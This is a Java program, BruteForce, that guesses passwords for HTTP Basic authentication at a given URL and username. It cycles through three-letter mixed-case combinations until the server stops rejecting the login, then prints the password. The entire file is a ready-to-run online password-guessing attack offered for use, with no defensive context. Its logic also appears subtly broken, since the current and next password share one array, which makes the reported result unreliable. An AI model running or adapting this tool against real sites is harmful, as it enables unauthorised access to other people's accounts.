import java.net.*;
import java.io.*;


public class BruteForce extends Authenticator {

    
    private String username;
    
    private URL url;
    
    private char [] nextPassword;
    
    private char [] thisPassword;

    
    public static void main(String [] args) {
        if(args.length!=2) {
            System.err.println("usage: BruteForce <url> <username>");
            System.exit(1);
        }
        BruteForce bf = null;
        try {
            bf = new BruteForce(args[0], args[1]);
        } catch (MalformedURLException me) {
            me.printStackTrace();
            System.exit(1);
        }
        bf.work();
        System.exit(0);
    }

    
    public BruteForce(String url, String username) 
            throws MalformedURLException {
        this.url = new URL(url);
        this.username = username;
        this.nextPassword = new char [] {'a'};
    }

    
    public void work() {
        Authenticator.setDefault(this);
        HttpURLConnection uc = null;
        try {
            uc = (HttpURLConnection) url.openConnection();
            uc.connect();
	        while(uc.getResponseCode()==HttpURLConnection.HTTP_UNAUTHORIZED
                    && nextPassword!=null) {
                try {
                    InputStream is = uc.getInputStream();
                    uc.connect();
                } catch (ProtocolException pe) {
                    uc = (HttpURLConnection) url.openConnection();
                } catch (NullPointerException npe) {
                    npe.printStackTrace();
                    System.exit(1);
                } 
            }
        } catch (java.io.IOException e) {
            e.printStackTrace();
            System.exit(1);
        }
        System.out.println("password=" + new String(thisPassword));
    }

    
    public PasswordAuthentication getPasswordAuthentication() {
        createNextPassword();
        return new PasswordAuthentication(username, thisPassword);
    }

    
    public void createNextPassword() {
        int i;
        if(thisPassword==null) {
            thisPassword = new char [] {'A', 'A', 'A'};
            nextPassword = new char [] {'A', 'A', 'B'};
            return;
        }
        thisPassword = nextPassword;
        if(nextPassword[2]=='Z') {
            nextPassword[2]='a';
            return;
        } else if(nextPassword[2]!='z') {
            i = (int) nextPassword[2];
            nextPassword[2]=(char) ++i;
        } else {
            nextPassword[2]='A';
            if(nextPassword[1]=='Z') {
                nextPassword[1]='a';
            } else if(nextPassword[1]!='z') {
                i = (int) nextPassword[1];
                nextPassword[1]=(char) ++i;
            } else {
                nextPassword[1]='A';
                if(nextPassword[0]=='Z') {
                    nextPassword[0]='a';
                } else if(nextPassword[0]!='z') {
                    i = (int) nextPassword[0];
                    nextPassword[0]=(char) ++i;
                } else {
                    nextPassword = null;
                }
            }
        }
    }
}
